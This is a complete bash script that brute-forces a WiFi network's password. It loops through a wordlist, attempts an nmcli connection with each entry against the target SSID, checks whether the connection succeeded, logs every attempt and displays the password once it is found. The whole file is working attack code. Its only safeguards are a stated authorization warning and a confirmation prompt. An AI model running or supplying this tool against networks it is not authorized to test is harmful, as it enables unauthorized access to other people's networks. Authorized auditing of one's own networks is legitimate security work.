#!/bin/bash

# WiFi Password Auditing Tool for Ubuntu
# WARNING: Only use on networks you own or have explicit authorization to test
# Usage: ./wifi-bruteforce.sh <SSID> <WORDLIST_FILE>

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

# Global variables
WIFI_INTERFACE=""
ETHERNET_INTERFACE=""
SSID=""
WORDLIST=""
LOG_FILE=""
FOUND=false
CURRENT_PASSWORD=""

# Cleanup function for Ctrl+C
cleanup() {
    echo -e "\n${YELLOW}Interrupted! Cleaning up...${NC}"
    
    # Kill any background processes
    jobs -p | xargs -r kill
    
    # Restore network connections
    echo -e "${BLUE}Restoring network connections...${NC}"
    
    # Re-enable WiFi
    nmcli radio wifi on
    sleep 1
    
    # Reconnect ethernet if it was disabled
    if [ -n "$ETHERNET_INTERFACE" ]; then
        nmcli device connect "$ETHERNET_INTERFACE" &>/dev/null
    fi
    
    # Try to reconnect to any previous network
    nmcli device connect "$WIFI_INTERFACE" &>/dev/null
    
    echo -e "${GREEN}Cleanup complete. Exiting.${NC}"
    exit 0
}

# Set trap for Ctrl+C
trap cleanup SIGINT SIGTERM

# Check if running with sudo
if [ "$EUID" -ne 0 ]; then
    echo -e "${RED}Error: This script must be run with sudo${NC}"
    echo "Usage: sudo ./wifi-bruteforce.sh <SSID> <WORDLIST_FILE>"
    exit 1
fi

# Check if required arguments are provided
if [ $# -lt 2 ]; then
    echo -e "${RED}Error: Missing arguments${NC}"
    echo "Usage: sudo ./wifi-bruteforce.sh <SSID> <WORDLIST_FILE>"
    echo "Example: sudo ./wifi-bruteforce.sh MyWiFi /path/to/passwords.txt"
    exit 1
fi

SSID="$1"
WORDLIST="$2"

# Check if wordlist file exists
if [ ! -f "$WORDLIST" ]; then
    echo -e "${RED}Error: Wordlist file '$WORDLIST' not found${NC}"
    exit 1
fi

# Get WiFi interface
WIFI_INTERFACE=$(nmcli device status | awk '/wifi/ {print $1}' | head -1)
if [ -z "$WIFI_INTERFACE" ]; then
    echo -e "${RED}Error: No WiFi interface found${NC}"
    echo "Available interfaces:"
    nmcli device status
    exit 1
fi

# Get ethernet interface (to disable temporarily)
ETHERNET_INTERFACE=$(nmcli device status | awk '/ethernet/ {print $1}' | head -1)

# Legal disclaimer
echo -e "${YELLOW}=========================================${NC}"
echo -e "${YELLOW}WiFi Password Security Auditing Tool${NC}"
echo -e "${YELLOW}=========================================${NC}"
echo -e "${RED}WARNING: Only use on networks you own!${NC}"
echo -e "${RED}Unauthorized access is illegal.${NC}"
echo -e "${RED}Press Ctrl+C at any time to stop and cleanup${NC}"
echo -e "${YELLOW}=========================================${NC}"
echo ""
echo -e "Target SSID: ${BLUE}$SSID${NC}"
echo -e "Wordlist: ${BLUE}$WORDLIST${NC}"
echo -e "WiFi Interface: ${BLUE}$WIFI_INTERFACE${NC}"
if [ -n "$ETHERNET_INTERFACE" ]; then
    echo -e "Ethernet Interface: ${BLUE}$ETHERNET_INTERFACE${NC} (will be temporarily disabled)"
fi
echo ""

# Count passwords in wordlist
TOTAL_PASSWORDS=$(wc -l < "$WORDLIST")
echo -e "Total passwords to try: ${BLUE}$TOTAL_PASSWORDS${NC}"
echo ""

# Confirm before starting
read -p "Continue with password testing? (yes/no): " CONFIRM
if [ "$CONFIRM" != "yes" ]; then
    echo "Aborted by user."
    exit 0
fi

echo ""
echo -e "${YELLOW}Starting password testing...${NC}"
echo ""

# Log file
LOG_FILE="wifi-audit-$(date +%Y%m%d-%H%M%S).log"
echo "WiFi Password Audit Log - $(date)" > "$LOG_FILE"
echo "Target SSID: $SSID" >> "$LOG_FILE"
echo "WiFi Interface: $WIFI_INTERFACE" >> "$LOG_FILE"
echo "Wordlist: $WORDLIST" >> "$LOG_FILE"
echo "----------------------------------------" >> "$LOG_FILE"

# Counter
ATTEMPT=0

# Disable ethernet temporarily to force WiFi use
if [ -n "$ETHERNET_INTERFACE" ]; then
    echo -e "${BLUE}Temporarily disabling ethernet connection...${NC}"
    nmcli device disconnect "$ETHERNET_INTERFACE" &>/dev/null
    echo "Ethernet disabled for testing" >> "$LOG_FILE"
fi

# Disconnect from any current WiFi network
echo -e "${BLUE}Disconnecting from current WiFi networks...${NC}"
nmcli device disconnect "$WIFI_INTERFACE" &>/dev/null
nmcli radio wifi off
sleep 2
nmcli radio wifi on
sleep 3

# Function to verify connection thoroughly
verify_connection() {
    local interface="$1"
    local target_ssid="$2"
    
    # Method 1: Check with iwgetid
    local current_ssid=$(iwgetid -r 2>/dev/null)
    
    # Method 2: Check with nmcli
    local nmcli_ssid=$(nmcli -t -f ACTIVE,SSID dev wifi | grep "^yes" | cut -d: -f2)
    
    # Method 3: Check connection state
    local state=$(nmcli -f GENERAL.STATE dev show "$interface" 2>/dev/null | grep "GENERAL.STATE" | grep -o "connected")
    
    # Get IP address
    local ip_addr=$(ip -4 addr show "$interface" 2>/dev/null | grep -oP '(?<=inet\s)\d+(\.\d+){3}' | head -1)
    
    # Debug output to log
    echo "  Verification - iwgetid: '$current_ssid', nmcli: '$nmcli_ssid', state: '$state', IP: '$ip_addr'" >> "$LOG_FILE"
    
    # Check if all conditions are met
    if [ "$current_ssid" = "$target_ssid" ] || [ "$nmcli_ssid" = "$target_ssid" ]; then
        if [ "$state" = "connected" ] && [ -n "$ip_addr" ]; then
            echo "$ip_addr"
            return 0
        fi
    fi
    
    return 1
}

# Function to attempt connection
try_connect() {
    local password="$1"
    
    # Disconnect first
    nmcli device disconnect "$WIFI_INTERFACE" &>/dev/null
    sleep 1
    
    # Try to connect using nmcli
    nmcli device wifi connect "$SSID" password "$password" ifname "$WIFI_INTERFACE" &>/dev/null &
    local pid=$!
    
    # Wait for connection attempt
    local max_wait=15
    local waited=0
    
    while [ $waited -lt $max_wait ]; do
        sleep 1
        waited=$((waited + 1))
        
        # Check if connected
        if verify_connection "$WIFI_INTERFACE" "$SSID" > /dev/null; then
            kill $pid 2>/dev/null
            return 0
        fi
        
        # Show progress dot every 2 seconds
        if [ $((waited % 2)) -eq 0 ]; then
            echo -n "." >> "$LOG_FILE"
        fi
    done
    
    # Kill the nmcli process if still running
    kill $pid 2>/dev/null
    wait $pid 2>/dev/null
    
    return 1
}

# Main loop
while IFS= read -r PASSWORD || [ -n "$PASSWORD" ]; do
    # Skip empty lines
    PASSWORD=$(echo "$PASSWORD" | tr -d '\r' | sed -e 's/^[[:space:]]*//' -e 's/[[:space:]]*$//')
    if [ -z "$PASSWORD" ]; then
        continue
    fi

    ATTEMPT=$((ATTEMPT + 1))
    CURRENT_PASSWORD="$PASSWORD"

    # Progress indicator
    echo -ne "${BLUE}[${ATTEMPT}/${TOTAL_PASSWORDS}]${NC} Trying: ${YELLOW}${PASSWORD}${NC}   \r"

    # Log attempt
    echo "Attempt $ATTEMPT: $PASSWORD" >> "$LOG_FILE"

    # Try to connect
    if try_connect "$PASSWORD"; then
        IP_ADDR=$(verify_connection "$WIFI_INTERFACE" "$SSID")
        
        # Clear the line and show success
        echo -e "\n${GREEN}=========================================${NC}"
        echo -e "${GREEN}SUCCESS! Password found!${NC}"
        echo -e "${GREEN}=========================================${NC}"
        echo -e "SSID: ${BLUE}$SSID${NC}"
        echo -e "Password: ${GREEN}$PASSWORD${NC}"
        echo -e "IP Address: ${BLUE}$IP_ADDR${NC}"
        echo -e "${GREEN}=========================================${NC}"

        # Log success
        echo "SUCCESS - Password found: $PASSWORD" >> "$LOG_FILE"
        echo "Attempt number: $ATTEMPT" >> "$LOG_FILE"
        echo "IP Address: $IP_ADDR" >> "$LOG_FILE"

        FOUND=true
        break
    else
        echo "FAILED" >> "$LOG_FILE"
    fi

done < "$WORDLIST"

echo ""
echo ""

# Final summary
if [ "$FOUND" = true ]; then
    echo -e "${GREEN}Audit completed - Password found after $ATTEMPT attempts${NC}"
    echo -e "${GREEN}Password: $CURRENT_PASSWORD${NC}"
    
    # Show connection details
    echo ""
    echo -e "${GREEN}Currently connected to $SSID${NC}"
    echo "Connection details:"
    nmcli device show "$WIFI_INTERFACE" | grep -E "GENERAL.STATE|IP4.ADDRESS|IP4.GATEWAY" | sed 's/^/  /'
    
    # Ask if user wants to keep the connection
    echo ""
    read -p "Keep this connection active? (yes/no): " KEEP_CONN
    if [ "$KEEP_CONN" != "yes" ]; then
        nmcli device disconnect "$WIFI_INTERFACE" &>/dev/null
    fi
else
    echo -e "${RED}Audit completed - Password not found${NC}"
    echo -e "${YELLOW}Tried $ATTEMPT passwords from the wordlist${NC}"
    echo "The password may not be in your wordlist."
fi

# Re-enable ethernet if it was disabled
if [ -n "$ETHERNET_INTERFACE" ]; then
    echo -e "${BLUE}Re-enabling ethernet connection...${NC}"
    nmcli device connect "$ETHERNET_INTERFACE" &>/dev/null
fi

# Final cleanup
echo ""
echo -e "Full log saved to: ${BLUE}$LOG_FILE${NC}"
echo ""

# Remove trap and exit normally
trap - SIGINT SIGTERM
exit 0
